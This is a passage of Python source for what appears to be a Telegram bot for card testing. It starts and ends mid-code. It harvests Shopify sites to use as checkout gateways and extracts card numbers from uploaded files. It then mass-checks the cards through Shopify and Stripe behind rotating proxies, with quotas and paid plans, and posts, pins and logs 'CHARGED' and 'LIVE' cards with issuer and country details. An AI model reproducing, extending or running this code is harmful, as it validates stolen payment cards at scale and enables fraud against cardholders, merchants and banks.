            async with direct_session().get(url, params=params, timeout=ct) as r:
                res = parse_response(await r.text(errors="ignore"), r.status)
                res["response"] = _sanitize_err(res.get("response", ""))
                res["_site"] = site
                return res
        except asyncio.TimeoutError:
            return {"cls": "timeout", "response": "timeout", "raw": "",
                    "amount": 0.0, "currency": "USD", "gateway": "Shopify",
                    "check_time": "", "_site": site}
        except Exception as e:
            return {"cls": "error", "response": _sanitize_err(str(e)[:100]),
                    "raw": "", "amount": 0.0, "currency": "USD",
                    "gateway": "Shopify", "check_time": "", "_site": site}

    return {"cls": "site_error", "response": "no with-site API configured",
            "amount": 0.0, "currency": "USD", "gateway": "Shopify",
            "check_time": "", "_site": site}

async def check_sites_clean(sites: List[str], timeout: Optional[float] = None) -> Dict[str, Any]:
    result = {"total": len(sites), "clean": [], "dead": [], "captcha": []}
    sem, lock = asyncio.Semaphore(8), asyncio.Lock()
    async def one(site: str):
        async with sem:
            try: res = await test_site(site, timeout=timeout or 15)
            except Exception as e:
                res = {"cls": "error", "response": _sanitize_err(str(e)[:60])}
            async with lock:
                cls, amount = res.get("cls", "error"), res.get("amount", 0.0)
                if cls in WORKING_SITE_CLASSES:
                    result["clean"].append({"site": site, "price": amount, "status": cls})
                elif cls == "captcha":
                    result["captcha"].append({"site": site, "price": amount})
                else:
                    result["dead"].append({"site": site, "reason": res.get("response", "")[:60]})
    await asyncio.gather(*(one(s) for s in sites))
    return result

async def bulk_add_sites(raw: str) -> Dict[str, Any]:
    raw_lines = [l.strip() for l in re.split(r"[\r\n,;]+", raw) if l.strip()]
    seen_sites, sites = set(), []
    for l in raw_lines:
        s = l.lower()
        s = s[8:] if s.startswith("https://") else s[7:] if s.startswith("http://") else s
        s = s.split("/")[0].strip()
        if s and s not in seen_sites:
            seen_sites.add(s); sites.append(s)

    max_p = float(get_setting("site_max_price", "6.0"))
    clean, upper, dead = [], [], []
    sem, lock = asyncio.Semaphore(10), asyncio.Lock()

    async def test_one(s: str):
        async with sem:
            res = await test_site(s, timeout=20)
            cls = res.get("cls", "error")
            amount = float(res.get("amount") or 0.0)
            resp = res.get("response", "")[:80]
            async with lock:
                is_captcha = ("CAPTCHA" in resp.upper() or
                              "PROPOSAL_ERROR" in resp.upper() or cls == "captcha")
                if cls in ("error", "timeout", "proxy_error", "site_error"):
                    dead.append({"site": s, "reason": resp or cls, "cls": cls})
                elif is_captcha or amount > max_p:
                    upper.append({"site": s, "price": amount, "cls": cls, "resp": resp})
                elif cls in WORKING_SITE_CLASSES:
                    clean.append({"site": s, "price": amount, "cls": cls})
                    add_site_db(s)
                else:
                    dead.append({"site": s, "reason": resp, "cls": cls})

    await asyncio.gather(*(test_one(s) for s in sites))
    return {"clean": clean, "upper": upper, "dead": dead,
            "total": len(sites), "max_price": max_p}

def _bulk_sites_report(result: Dict[str, Any]) -> str:
    clean = result.get("clean", [])
    upper = result.get("upper", [])
    dead = result.get("dead", [])
    max_p = result.get("max_price", 6.0)
    lines = [
        f"{pe('check')} <b>{sc('Site Checker Complete')}</b>",
        f"<blockquote>{pe('shop')} {sc('Total')}: <b>{result['total']}</b>\n"
        f"{pe('check')} {sc('Clean')}: <b>{len(clean)}</b>\n"
        f"{pe('warn')} {sc('High Price')}: <b>{len(upper)}</b>\n"
        f"{pe('cross2')} {sc('Dead')}: <b>{len(dead)}</b></blockquote>"
    ]
    if clean:
        lines.append(f"<blockquote><b>{pe('check')} {sc('Saved')}:</b>")
        for s in clean[:12]:
            lines.append(f"  <code>{esc(s['site'])}</code> · <b>${s['price']:.2f}</b>")
        if len(clean) > 12:
            lines.append(f"  <i>...+{len(clean)-12} more (see file)</i>")
        lines.append("</blockquote>")
    return "\n".join(lines)

def _make_sites_txt(sites_list: list, label: str) -> bytes:
    lines = [f"# {label}",
             f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ""]
    for s in sites_list:
        if isinstance(s, dict):
            lines.append(f"{s.get('site', s)} | ${s.get('price', 0):.2f} | "
                         f"{s.get('cls', '')} | {s.get('resp', s.get('reason', ''))}"[:120])
        else:
            lines.append(str(s))
    return "\n".join(lines).encode("utf-8")

# ── CC file scanner ────────────────────────────────────────────────────────
_TEXT_EXTS = (".txt", ".csv", ".log", ".dat", ".list", ".text", ".md", ".tsv")

async def _scan_file_for_ccs(bot, doc) -> List[str]:
    cards = []
    try:
        if (doc.file_size or 0) > 5 * 1024 * 1024: return cards
        fname = (doc.file_name or "").lower()
        if fname and not any(fname.endswith(e) for e in _TEXT_EXTS):
            return cards
        buf = await bot.download_file((await bot.get_file(doc.file_id)).file_path)
        raw = buf.read().decode("utf-8", errors="ignore")
    except: return cards
    if not raw: return cards
    seen = set()
    for tok in re.split(r"[\s,;]+", raw):
        n = normalize_cc(tok)
        if n and n not in seen:
            seen.add(n); cards.append(n)
            if len(cards) >= 500: break
    return cards

# ── Bot reference for background sends ─────────────────────────────────────
_bot_ref: Optional[Bot] = None

async def notify_owner(text: str) -> None:
    if not _bot_ref: return
    try:
        await _bot_ref.send_message(OWNER_ID, text[:3900], parse_mode=ParseMode.HTML)
    except Exception as e:
        log.warning(f"owner notify failed: {e}")

# ── Per-CC logging helper (used by both single & mass) ─────────────────────
async def _log_check(uid: int, cc: str, res: Dict[str, Any], mode: str):
    """Store every check with full detail (status, mode, response, error_trace)."""
    try:
        cls = res.get("cls", "error")
        resp = _sanitize_err(res.get("response", ""))[:200]
        gw = res.get("gateway", "Shopify")
        status_str = "HIT" if is_hit(cls) else ("SITE_ERROR" if cls == "site_error" else
                                                ("PROXY_ERROR" if cls == "proxy_error" else
                                                 ("TIMEOUT" if cls == "timeout" else
                                                  ("ERROR" if cls == "error" else "DECLINED"))))
        error_trace = ""
        if cls in ("error", "proxy_error", "timeout"):
            try: error_trace = traceback.format_exc()[-800:]
            except: error_trace = str(res.get("raw", ""))[:500]
        async with _get_write_lock():
            with db() as c:
                c.execute(
                    "INSERT INTO check_logs(uid, cc, response, status, gateway, mode, error_trace, ts) "
                    "VALUES (?,?,?,?,?,?,?,?)",
                    (uid, cc, resp, status_str, gw, mode, error_trace,
                     datetime.now(timezone.utc).isoformat()))
                if is_hit(cls):
                    c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
    except Exception as e:
        log.error(f"_log_check failed: {e}")

# ── Fancy hit-log caption (NEW) ────────────────────────────────────────────
def format_hit_log_caption(cc: str, res: Dict[str, Any], bin_info: Any,
                           site: str, uid: int = 0, username: str = "") -> str:
    """Very fancy hit log — goes to hit_log_channel."""
    try:
        cls = res.get("cls", "charged")
        resp = _sanitize_err(res.get("response", ""))[:120]
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD")
        gateway = res.get("gateway", "Shopify")
        ctime = res.get("check_time", "")
        masked = _mask_cc(cc)
        brand = brand_pe(cc)
        bank, country, flag, ctype = "N/A", "N/A", "🌍", "N/A"
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            bank = str(bin_info.get("Issuer") or "N/A")
            cd = bin_info.get("Country") or {}
            country = str(cd.get("Name") or "N/A")
            flag = country_flag(cd.get("Code", ""))
            ctype = str(bin_info.get("Type") or "N/A").upper()
        if cls == "charged":
            title = f"{pe('gem')} <b>✨ CHARGED HIT ✨</b> {pe('gem')}"
        elif cls == "approved_nsf":
            title = f"{pe('online')} <b>💎 LIVE · NSF</b> {pe('online')}"
        elif cls == "approved_ccn":
            title = f"{pe('online')} <b>💎 LIVE · CCN</b> {pe('online')}"
        elif cls == "approved_3ds":
            title = f"{pe('online')} <b>💎 LIVE · 3DS</b> {pe('online')}"
        else:
            title = f"{pe('online')} <b>💎 LIVE CARD</b> {pe('online')}"
        return (
            f"{title}\n"
            f"<blockquote>"
            f"{brand}  <code>{masked}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{pe('check')} <b>RESP</b> · {esc(resp)}\n"
            f"{pe('diamond')} <b>AMOUNT</b> · <b>${amount:.2f} {esc(currency)}</b>\n"
            f"{pe('refresh')} <b>GATE</b> · {esc(gateway)}\n"
            f"{pe('hourglass')} <b>TIME</b> · {esc(ctime or 'N/A')}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{pe('shop')} <b>BANK</b> · {esc(bank)}\n"
            f"{flag} <b>COUNTRY</b> · {esc(country)}\n"
            f"{pe('star')} <b>TYPE</b> · {esc(ctype)}\n"
            f"{pe('link')} <b>SITE</b> · <code>{esc(site or 'N/A')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{pe('user')} <b>BY</b> · {_user_link(uid, username) if uid else 'GOKU'}\n"
            f"<i>{datetime.now().strftime('%I:%M %p')}</i>\n"
            f"{HIDDEN_CREDIT}</blockquote>"
        )[:1024]
    except Exception:
        return f"Hit · {_mask_cc(cc)} · {res.get('response','')}"[:1024]

# ── Fancy force-channel caption (NEW, different style) ─────────────────────
def format_force_channel_caption(cc: str, res: Dict[str, Any], bin_info: Any,
                                 site: str, uid: int = 0, username: str = "") -> str:
    """Force-channel style — different look, more stylish."""
    try:
        cls = res.get("cls", "approved")
        resp = _sanitize_err(res.get("response", ""))[:120]
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD")
        gateway = res.get("gateway", "Stripe")
        masked = _mask_cc(cc)
        brand = brand_pe(cc)
        bank, country, flag, ctype = "N/A", "N/A", "🌍", "N/A"
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            bank = str(bin_info.get("Issuer") or "N/A")
            cd = bin_info.get("Country") or {}
            country = str(cd.get("Name") or "N/A")
            flag = country_flag(cd.get("Code", ""))
            ctype = str(bin_info.get("Type") or "N/A").upper()
        icons = {
            "charged": f"{pe('glow_star')}",
            "approved": f"{pe('online')}",
            "approved_nsf": f"{pe('online')}",
            "approved_ccn": f"{pe('online')}",
            "approved_3ds": f"{pe('online')}",
        }
        icon = icons.get(cls, f"{pe('star')}")
        label = {
            "charged": "CHARGED · HIT",
            "approved": "LIVE · AUTH OK",
            "approved_nsf": "LIVE · NSF",
            "approved_ccn": "LIVE · CCN",
            "approved_3ds": "LIVE · 3DS",
        }.get(cls, "LIVE CARD")
        return (
            f"{icon} <b>[ {sc(label)} ]</b> {icon}\n"
            f"<blockquote>"
            f"<b>━━━━━━━ {sc('CARD')} ━━━━━━━</b>\n"
            f"{brand}  <code>{masked}</code>\n"
            f"<b>━━━━━━━ {sc('RESULT')} ━━━━━━━</b>\n"
            f"➜ {pe('check')} {esc(resp)}\n"
            f"➜ {pe('diamond')} <b>${amount:.2f} {esc(currency)}</b>\n"
            f"➜ {pe('refresh')} {esc(gateway)}\n"
            f"<b>━━━━━━━ {sc('BIN INFO')} ━━━━━━━</b>\n"
            f"➜ {pe('shop')} {esc(bank)}\n"
            f"➜ {flag} {esc(country)}\n"
            f"➜ {pe('star')} {esc(ctype)}\n"
            f"<b>━━━━━━━ {sc('EXTRA')} ━━━━━━━</b>\n"
            f"➜ {pe('link')} <code>{esc(site or 'N/A')}</code>\n"
            f"➜ {pe('user')} {_user_link(uid, username) if uid else 'GOKU'}\n"
            f"<i>{datetime.now().strftime('%d %b %Y · %I:%M %p')}</i>\n"
            f"{HIDDEN_CREDIT}</blockquote>"
        )[:1024]
    except Exception:
        return f"Live · {_mask_cc(cc)} · {res.get('response','')}"[:1024]

def _mask_cc(cc: str) -> str:
    parts = cc.split("|")
    if len(parts) == 4:
        return f"{parts[0][:6]}|**|**|***"
    return cc[:6] + "****" + cc[-4:]

# ── record_charged — sends to hit log + force channel with DIFFERENT captions
async def record_charged(cc: str, res: Dict[str, Any], site: str,
                         uid: int = 0, bin_info: Any = None) -> None:
    try:
        async with _get_write_lock():
            with db() as c:
                c.execute(
                    "INSERT INTO charged_hits(cc, site, response, amount, currency, uid, ts) "
                    "VALUES (?,?,?,?,?,?,?)",
                    (cc, site, res.get("response", "")[:200],
                     float(res.get("amount", 0) or 0),
                     res.get("currency", "USD"), int(uid or 0),
                     datetime.now(timezone.utc).isoformat()))
    except Exception as e:
        log.error(f"record_charged db: {e}")

    if bin_info is None:
        try: bin_info = await lookup_bin(cc.split("|")[0][:6])
        except: bin_info = None

    checker_name = ""
    if uid:
        try:
            u = get_user(uid)
            if u: checker_name = u["username"] or ""
        except: pass

    cls = res.get("cls", "charged")
    hit_media = random.choice(IMAGES)

    # 1. Hit log channel — fancy caption
    hit_log = get_setting("hit_log_channel")
    if hit_log and _bot_ref and is_hit(cls):
        try:
            chat_id = int(hit_log) if re.fullmatch(r"-?\d+", hit_log) else hit_log
            caption = format_hit_log_caption(cc, res, bin_info, site, uid, checker_name)
            try: await _bot_ref.send_photo(chat_id, photo=hit_media, caption=caption, parse_mode="HTML")
            except: await _bot_ref.send_message(chat_id, caption, parse_mode="HTML",
                                                disable_web_page_preview=True)
        except Exception as e: log.debug(f"hit_log: {e}")

    # 2. Force/public channel — DIFFERENT fancy caption
    force_ch = get_setting("public_gc_id")
    if force_ch and _bot_ref and is_hit(cls):
        try:
            chat_id = int(force_ch) if re.fullmatch(r"-?\d+", force_ch) else force_ch
            caption = format_force_channel_caption(cc, res, bin_info, site, uid, checker_name)
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                pbtn(sc("GO TO BOT"), icon="chat", url=f"https://t.me/{BOT_USERNAME}")
            ]])
            try: msg = await _bot_ref.send_photo(chat_id, photo=hit_media, caption=caption,
                                                 parse_mode="HTML", reply_markup=kb)
            except: msg = await _bot_ref.send_message(chat_id, caption, parse_mode="HTML",
                                                      reply_markup=kb, disable_web_page_preview=True)
            if msg:
                try: await _bot_ref.pin_chat_message(chat_id, msg.message_id, disable_notification=True)
                except: pass
        except Exception as e: log.debug(f"force_ch: {e}")

    # 3. Charged GC (legacy) — same as hit log
    charged_gc = get_setting("charged_gc_id")
    if charged_gc and _bot_ref and cls == "charged" and charged_gc != hit_log:
        try:
            chat_id = int(charged_gc) if re.fullmatch(r"-?\d+", charged_gc) else charged_gc
            caption = format_hit_log_caption(cc, res, bin_info, site, uid, checker_name)
            try: await _bot_ref.send_photo(chat_id, photo=hit_media, caption=caption, parse_mode="HTML")
            except: await _bot_ref.send_message(chat_id, caption, parse_mode="HTML",
                                                disable_web_page_preview=True)
        except Exception as e: log.debug(f"charged_gc: {e}")

async def send_chat_hit(bot, chat_id, cc, res, site):
    try: bin_info = await lookup_bin(cc.split("|")[0][:6])
    except: bin_info = None
    text = format_result(cc, res, bin_info)
    media = random.choice(IMAGES)
    try: await bot.send_photo(chat_id, photo=media, caption=text, parse_mode="HTML")
    except: await bot.send_message(chat_id, text, parse_mode="HTML")

# ── Loading / formatting helpers ───────────────────────────────────────────
BAR_GRADIENT = ["🟥", "🟧", "🟨", "🟩"]

def make_bar(pct, width=12):
    filled = int(round(width * max(0, min(100, pct)) / 100))
    return "▰" * filled + "▱" * (width - filled)

def make_fancy_bar(pct):
    filled = int(round(10 * max(0, min(100, pct)) / 100))
    return "".join(BAR_GRADIENT[min(3, i * 4 // 10)] if i < filled else "⬛"
                   for i in range(10))

def spinner_frame(i): return ["◐", "◓", "◑", "◒"][i % 4]
def _fmt_eta(s): return f"{int(s)}s" if s < 60 else f"{int(s)//60}m {int(s)%60}s"

LOADING_FRAMES = [
    f"{pe('loading')} <b>{sc('Connecting')}</b>",
    f"{pe('refresh')} <b>{sc('Checking')}</b>",
    f"{pe('hourglass')} <b>{sc('Processing')}</b>",
    f"{pe('diamond')} <b>{sc('Analyzing')}</b>",
]

async def animate_loading(msg, cc_line, stop_event):
    i = 0
    while not stop_event.is_set():
        try:
            await msg.edit_text(
                f"{spinner_frame(i)} {LOADING_FRAMES[i % len(LOADING_FRAMES)]}\n"
                f"<blockquote><code>{cc_line}</code></blockquote>",
                parse_mode="HTML")
        except: pass
        i += 1
        try: await asyncio.wait_for(stop_event.wait(), timeout=1.2)
        except asyncio.TimeoutError: pass

def format_result(cc: str, res: Dict[str, Any], bin_info=None) -> str:
    try:
        cls = res.get("cls", "declined")
        resp_msg = _sanitize_err(res.get("response", "Unknown") or "Unknown")
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD") or "USD"
        gateway = res.get("gateway", "Shopify") or "Shopify"
        ctime = res.get("check_time", "") or ""
        if cls in ("error", "timeout", "proxy_error", "site_error", "rate_limited"):
            icon = pe("warn_red") if cls in ("proxy_error","site_error") else pe("cross1")
            label = {"error":"Check Failed","timeout":"Timed Out","proxy_error":"Proxy Error",
                     "site_error":"Site Error","rate_limited":"Rate Limited"}.get(cls, "Failed")
            return (f"{icon} <b>{sc(label)}</b>\n"
                    f"<blockquote>{brand_pe(cc)} <code>{cc}</code>\n"
                    f"{pe('warn')} {esc(resp_msg[:120])}\n{HIDDEN_CREDIT}</blockquote>")
        title_map = {
            "charged": f"{pe('check')} <b>{sc('CHARGED HIT')}</b>",
            "approved_3ds": f"{pe('online')} <b>{sc('LIVE · 3DS')}</b>",
            "approved_nsf": f"{pe('online')} <b>{sc('LIVE · NSF')}</b>",
            "approved_ccn": f"{pe('online')} <b>{sc('LIVE · CCN')}</b>",
            "approved": f"{pe('online')} <b>{sc('LIVE CARD')}</b>",
            "declined": f"{pe('cross2')} <b>{sc('DECLINED')}</b>",
        }
        title = title_map.get(cls, f"{pe('cross2')} <b>{sc('DECLINED')}</b>")
        bin_line = ""
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            cd = bin_info.get("Country") or {}
            _ctype = str(bin_info.get("Type") or "N/A").upper()
            bin_line = (f"{pe('shop')}  <b>{sc('Bank')}</b>  ·  {esc(bin_info.get('Issuer','N/A') or 'N/A')}\n"
                        f"{country_flag(cd.get('Code',''))}  <b>{sc('Country')}</b>  ·  {esc(cd.get('Name','N/A') or 'N/A')}\n"
                        f"{pe('star')}  <b>{sc('Type')}</b>  ·  {esc(_ctype)}\n")
        time_line = f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  {esc(ctime)}\n" if ctime else ""
        return (f"{title}\n"
                f"<blockquote>{brand_pe(cc)}  <code>{cc}</code></blockquote>\n"
                f"<blockquote>{pe('check2')}  <b>{sc('Resp')}</b>  ·  {esc(resp_msg)}\n"
                f"{pe('gem')}  <b>{sc('Amount')}</b>  ·  <b>${amount:.2f} {esc(currency)}</b>\n"
                f"{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(gateway)}\n"
                f"{time_line}{bin_line}\n{HIDDEN_CREDIT}</blockquote>")
    except:
        return f"Result: {res.get('cls', 'unknown')} - {res.get('response', '')}"
        # ── Single check flow ─────────────────────────────────────────────────────
user_cooldowns = {}

def refresh_daily(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    with db() as c:
        row = c.execute("SELECT last_credit_date, last_check_date FROM users WHERE uid=?",
                        (uid,)).fetchone()
        if row:
            if row["last_credit_date"] != today:
                daily_cr = int(get_setting("daily_credits", "50"))
                c.execute("UPDATE users SET credits=credits+?, last_credit_date=? WHERE uid=?",
                          (daily_cr, today, uid))
            if row["last_check_date"] != today:
                c.execute("UPDATE users SET daily_checks=0, last_check_date=? WHERE uid=?",
                          (today, uid))

def consume_quota(uid):
    if is_admin(uid): return True, "admin"
    ensure_user(uid); refresh_daily(uid); u = get_user(uid)
    if not u: return False, "limit"
    plan_key = u["plan"] if u["plan"] in PLANS else "free"
    if plan_key in ("premium", "max", "unlimited"):
        with db() as c:
            c.execute("UPDATE users SET daily_checks=daily_checks+1, "
                      "total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "unlimited"
    if u["daily_checks"] < PLANS[plan_key]["limit"]:
        with db() as c:
            c.execute("UPDATE users SET daily_checks=daily_checks+1, "
                      "total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "daily"
    if u["credits"] >= 2:
        with db() as c:
            c.execute("UPDATE users SET credits=credits-2, "
                      "total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "credits"
    return False, "limit"

def apply_streak(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    yesterday = (datetime.now(timezone.utc).date() - timedelta(days=1)).isoformat()
    result = {"streak": 0, "reward": None, "credits": 0, "new_day": False}
    try:
        with db() as c:
            row = c.execute("SELECT streak, last_streak_date, credits FROM users WHERE uid=?",
                            (uid,)).fetchone()
            if not row: return result
            streak = row["streak"] or 0
            last_date = row["last_streak_date"] or ""
            credits = row["credits"] or 0
            if last_date == today:
                result.update(streak=streak, credits=credits); return result
            streak = (streak + 1) if last_date == yesterday else 1
            reward = None
            if streak == 7:
                credits += 50; reward = "+50 credits (7-day streak)"
            elif streak == 30:
                upgrade_user(uid, "pro", 1); reward = "1-day Pro trial (30-day streak)"
            c.execute("UPDATE users SET streak=?, last_streak_date=?, credits=? WHERE uid=?",
                      (streak, today, credits, uid))
            result.update(streak=streak, reward=reward, credits=credits, new_day=True)
    except: pass
    return result

async def process_check_logic(msg, cc_line: str, bot, uid=None, username=None,
                              mode="shopify"):
    """
    Single-CC checker. mode="shopify" or "stripe".
    Logs every check to check_logs (with error trace on failure).
    """
    try:
        if uid is None: uid = msg.from_user.id
        if username is None:
            username = (msg.from_user.username or "") if msg.from_user else ""
    except Exception:
        if uid is None: return
    if bot is None:
        try: bot = _bot_ref
        except: return

    user = get_user_or_create(uid, username)
    if not user:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Error')}</b>. /start", parse_mode="HTML")
    if user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('You are banned')}</b>", parse_mode="HTML")

    user_proxies = user_proxy_list(uid)
    if (not is_admin(uid) and not user_proxies
            and mode == "stripe" and get_setting("proxy_required", "0") == "1"):
        return await msg.answer(
            f"{pe('cross1')} <b>{sc('Proxy Required for Stripe Auth')}</b>\n"
            f"<blockquote>{pe('link')} {sc('Add via')} /proxy</blockquote>",
            parse_mode="HTML")

    now, cd = time.time(), get_check_cooldown()
    if uid in user_cooldowns and now - user_cooldowns[uid] < cd:
        return await msg.answer(
            f"{pe('stop')} {sc('Cooldown')}: <b>{cd - int(now - user_cooldowns[uid])}s</b>",
            parse_mode="HTML")
    user_cooldowns[uid] = now

    ok, _ = consume_quota(uid)
    if not ok:
        u = get_user(uid)
        pk = u["plan"] if u and u["plan"] in PLANS else "free"
        return await msg.answer(
            f"{pe('unlock')} <b>{sc('Limit Reached')}</b>\n"
            f"<blockquote>{pe('gem')} {PLANS[pk]['name']}\n"
            f"{pe('star')} {sc('Credits')}: {u['credits'] if u else 0} ({sc('need 2')})</blockquote>\n"
            f"/shop", parse_mode="HTML")

    proxy = rotate_proxy(uid, user_proxies) if user_proxies else None

    loading = await msg.answer(
        f"{spinner_frame(0)} <b>{sc('Connecting')}...</b>\n"
        f"<blockquote><code>{cc_line}</code></blockquote>",
        parse_mode="HTML")
    stop_ev = asyncio.Event()
    anim_task = asyncio.create_task(animate_loading(loading, cc_line, stop_ev))

    try:
        try: await bot.send_chat_action(msg.chat.id, "typing")
        except: pass
        res = await call_api(cc_line, proxy=proxy, uid=uid, mode=mode, single=True)
    except Exception as e:
        res = {"cls": "error", "response": _sanitize_err(str(e)),
               "amount": 0.0, "currency": "USD",
               "gateway": "Stripe" if mode == "stripe" else "Shopify",
               "check_time": ""}
    finally:
        stop_ev.set()
        try: await asyncio.wait_for(anim_task, timeout=2.0)
        except: pass

    # Log every check (with mode)
    await _log_check(uid, cc_line, res, mode)

    bin_info = None
    if res.get("cls", "error") not in ("error", "proxy_error", "timeout"):
        try: bin_info = await lookup_bin(cc_line.split("|")[0][:6])
        except: pass
        if is_hit(res["cls"]):
            try:
                await record_charged(cc_line, res, res.get("_site", ""), uid,
                                     bin_info=bin_info)
            except Exception as e:
                log.error(f"process_check_logic record_charged: {e}")

    text = format_result(cc_line, res, bin_info)
    hit = is_hit(res.get("cls", "declined"))
    btns = [pbtn(sc("Recheck"), icon="refresh", callback_data=f"recheck:{mode}:{cc_line}")]
    if hit:
        btns.append(pbtn(sc("Save"), icon="book", color="success",
                         callback_data=f"save:{cc_line}"))

    try: await loading.delete()
    except: pass

    kb = InlineKeyboardMarkup(inline_keyboard=[btns])
    if hit:
        media = random.choice(VIDEOS)
        try: await msg.answer_video(video=media, caption=text, parse_mode="HTML",
                                    reply_markup=kb)
        except: await msg.answer(text, parse_mode="HTML", reply_markup=kb)
    else:
        media = random.choice(IMAGES)
        try: await msg.answer_photo(photo=media, caption=text, parse_mode="HTML",
                                    reply_markup=kb)
        except: await msg.answer(text, parse_mode="HTML", reply_markup=kb)

# ── Mass check engine (fixed · per-CC logging · live progress) ─────────────
async def _mass_check_one(cc: str, proxy: Optional[str], uid: int,
                          mode: str) -> Dict[str, Any]:
    try:
        return await asyncio.wait_for(
            call_api(cc, proxy=proxy, uid=uid, mode=mode, single=False),
            timeout=CHECK_TIMEOUT + 20)
    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "timeout", "raw": "",
                "amount": 0.0, "currency": "USD",
                "gateway": "Stripe" if mode == "stripe" else "Shopify",
                "check_time": ""}
    except Exception as e:
        return {"cls": "error", "response": _sanitize_err(str(e)) or "error",
                "raw": "", "amount": 0.0, "currency": "USD",
                "gateway": "Stripe" if mode == "stripe" else "Shopify",
                "check_time": ""}

async def run_mass_check(msg, cards, bot, bypass_quota=False, uid=None,
                         username=None, mode="shopify"):
    if uid is None: uid = msg.from_user.id
    if username is None: username = msg.from_user.username or ""

    user = get_user_or_create(uid, username)
    if not user or user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>",
                                parse_mode="HTML")

    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c.strip())
        if n and n not in seen:
            seen.add(n); normalized.append(n)
    if not normalized:
        return await msg.answer(f"{pe('warn')} <b>{sc('No valid cards')}</b>",
                                parse_mode="HTML")

    total = len(normalized)
    _dead_proxies_run.clear()
    _proxy_fail_streak.clear()

    source_proxies = user_proxy_list(uid)
    live_proxies: List[str] = []
    if source_proxies:
        pre = await msg.answer(
            f"{pe('refresh')} <b>{sc('Preflight')}</b> — "
            f"{sc('validating proxies')}...", parse_mode="HTML")
        try:
            pf = await preflight_proxies(uid, source_proxies)
            live_proxies = pf["live"]
        except: pass
        try: await pre.delete()
        except: pass

    task_id, cancel_ev = uuid.uuid4().hex[:8], asyncio.Event()
    _mass_tasks[task_id] = cancel_ev

    counts = defaultdict(int)
    results: Dict[str, tuple] = {}
    completed = 0
    hits_count = 0
    start_time = time.time()
    last_edit = {"t": 0.0}

    bot_conc = (MASS_CONCURRENCY_LB_ADMIN
                if (bypass_quota or is_admin(uid))
                else MASS_CONCURRENCY_LB_PREMIUM)
    batch_size = MASS_BATCH_SIZE_LB
    batch_delay = MASS_BATCH_DELAY_LB
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Cancel"), icon="stop", color="danger",
              callback_data=f"mc:cancel:{task_id}")
    ]])

    def render_progress():
        elapsed = time.time() - start_time
        pct = int(100 * completed / total) if total else 0
        speed = (completed / elapsed) if elapsed > 0 and completed > 0 else 0
        eta = ((total - completed) / speed) if speed > 0 else 0
        return (
            f"{pe('loading')} <b>{sc('Mass Checking')}</b> · "
            f"{completed}/{total} · <b>{pct}%</b>\n"
            f"<code>{make_bar(pct, width=14)}</code>\n"
            f"{make_fancy_bar(pct)}\n"
            f"<blockquote>{pe('check')} {sc('Hits')}: <b>{hits_count}</b> · "
            f"{pe('cross2')} {sc('Declined')}: <b>{counts['declined']}</b> · "
            f"{pe('warn')} {sc('Err')}: <b>{counts['error'] + counts['timeout'] + counts['proxy_error'] + counts['site_error']}</b></blockquote>\n"
            f"<blockquote>{pe('hourglass')} {sc('ETA')}: <b>{_fmt_eta(eta)}</b> · "
            f"{pe('percent')} <b>{speed:.1f} cc/s</b></blockquote>"
        )

    progress_msg = await msg.answer(render_progress(), parse_mode="HTML",
                                     reply_markup=cancel_kb)

    async def handle_result(cc: str, res: Dict[str, Any]):
        nonlocal completed, hits_count
        cls = res.get("cls", "error")
        site_ = res.get("_site", "")
        resp_ = _sanitize_err(res.get("response", ""))
        # log every check
        await _log_check(uid, cc, res, mode)
        if is_hit(cls):
            results[cc] = (cls.upper(), resp_[:35])
            counts[cls] += 1
            hits_count += 1
            try:
                await record_charged(cc, res, site_, uid)
            except Exception as e:
                log.error(f"mass record_charged: {e}")
        elif cls in RETRYABLE_CLS:
            results[cc] = ("ERROR", resp_[:35])
            counts["error"] += 1
        else:
            results[cc] = ("DECLINED", resp_[:35])
            counts["declined"] += 1
        completed += 1

    sem = asyncio.Semaphore(bot_conc)
    lock = asyncio.Lock()

    async def worker(cc: str):
        if cancel_ev.is_set(): return
        # quota check (soft) — admins bypass
        if not (bypass_quota or is_admin(uid)):
            ok, _ = consume_quota(uid)
            if not ok:
                async with lock:
                    counts["quota"] += 1
                return
        proxy = rotate_proxy(uid, live_proxies) if live_proxies else None
        async with sem:
            if cancel_ev.is_set(): return
            res = await _mass_check_one(cc, proxy, uid, mode)
        async with lock:
            await handle_result(cc, res)
            now = time.time()
            if now - last_edit["t"] >= 1.5 or completed == total:
                last_edit["t"] = now
                try:
                    await progress_msg.edit_text(render_progress(),
                                                 parse_mode="HTML",
                                                 reply_markup=cancel_kb)
                except: pass

    try:
        for i in range(0, total, batch_size):
            if cancel_ev.is_set(): break
            chunk = normalized[i:i + batch_size]
            await asyncio.gather(*(worker(cc) for cc in chunk),
                                 return_exceptions=True)
            if i + batch_size < total and not cancel_ev.is_set():
                try:
                    await asyncio.wait_for(cancel_ev.wait(), timeout=batch_delay)
                except asyncio.TimeoutError:
                    pass
    finally:
        _mass_tasks.pop(task_id, None)

    elapsed = time.time() - start_time
    cancelled = cancel_ev.is_set()
    final = (
        f"{pe('check' if not cancelled else 'stop')} "
